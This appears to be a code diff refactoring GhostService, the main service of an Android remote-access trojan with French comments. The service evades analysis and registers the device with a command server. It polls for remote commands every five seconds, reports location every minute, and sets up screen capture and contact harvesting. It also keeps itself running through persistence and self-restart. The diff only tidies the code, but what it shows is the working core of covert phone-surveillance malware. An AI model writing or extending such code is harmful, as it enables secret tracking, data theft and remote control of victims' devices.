@@ -51,31 +51,25 @@ public class GhostService extends Service {
     public void onCreate() {
         super.onCreate();
         
-        // Anti-détection
         antiAnalysis = new AntiAnalysis(this);
         if (antiAnalysis.shouldStop()) {
             stopSelf();
             return;
         }
         
-        // Native lib
         nativeLib = new NativeLib();
         
-        // Configuration
         prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
         String serverUrl = prefs.getString("server_url", "");
         String apiKey = prefs.getString("api_key", "");
         String deviceId = prefs.getString("device_id", "");
         
-        // Threads
         backgroundThread = new HandlerThread("GhostBackground");
         backgroundThread.start();
         backgroundHandler = new Handler(backgroundThread.getLooper());
         
-        // Planificateur
-        scheduler = Executors.newScheduledThreadPool(3);
+        scheduler = Executors.newScheduledThreadPool(5);
         
-        // Gestionnaires
         networkManager = new NetworkManager(this, serverUrl, apiKey, deviceId);
         commandExecutor = new CommandExecutor(this, networkManager);
         screenCapture = new ScreenCapture(this, networkManager);
@@ -87,17 +81,11 @@ public class GhostService extends Service {
         contactManager = new ContactManager(this, networkManager);
         persistenceManager = new PersistenceManager(this);
         
-        // Notification
         createNotificationChannel();
         startForeground(NOTIFICATION_ID, createNotification());
         
-        // Enregistrement
         registerDevice();
-        
-        // Tâches planifiées
         startScheduledTasks();
-        
-        // Persistance
         persistenceManager.applyPersistence();
         
         Log.i(TAG, "Service démarré");
@@ -129,31 +117,14 @@ public class GhostService extends Service {
     }
     
     private void registerDevice() {
-        backgroundHandler.post(() -> {
-            networkManager.registerDevice();
-        });
+        backgroundHandler.post(() -> networkManager.registerDevice());
     }
     
     private void startScheduledTasks() {
-        // Commandes toutes les 5 secondes
-        scheduler.scheduleAtFixedRate(() -> {
-            commandExecutor.checkCommands();
-        }, 0, 5, TimeUnit.SECONDS);
-        
-        // Localisation toutes les minutes
-        scheduler.scheduleAtFixedRate(() -> {
-            locationTracker.sendLocation();
-        }, 0, 60, TimeUnit.SECONDS);
-        
-        // Heartbeat toutes les 30 secondes
-        scheduler.scheduleAtFixedRate(() -> {
-            networkManager.sendHeartbeat();
-        }, 0, 30, TimeUnit.SECONDS);
-        
-        // Sync toutes les heures
-        scheduler.scheduleAtFixedRate(() -> {
-            syncAllData();
-        }, 1, 1, TimeUnit.HOURS);
+        scheduler.scheduleAtFixedRate(() -> commandExecutor.checkCommands(), 0, 5, TimeUnit.SECONDS);
+        scheduler.scheduleAtFixedRate(() -> locationTracker.sendLocation(), 0, 60, TimeUnit.SECONDS);
+        scheduler.scheduleAtFixedRate(() -> networkManager.sendHeartbeat(), 0, 30, TimeUnit.SECONDS);
+        scheduler.scheduleAtFixedRate(() -> syncAllData(), 1, 1, TimeUnit.HOURS);
     }
     
     private void syncAllData() {
@@ -172,10 +143,7 @@ public class GhostService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        
         scheduler.shutdown();
-        
-        // Redémarrer
         persistenceManager.selfRestart();
     }
     
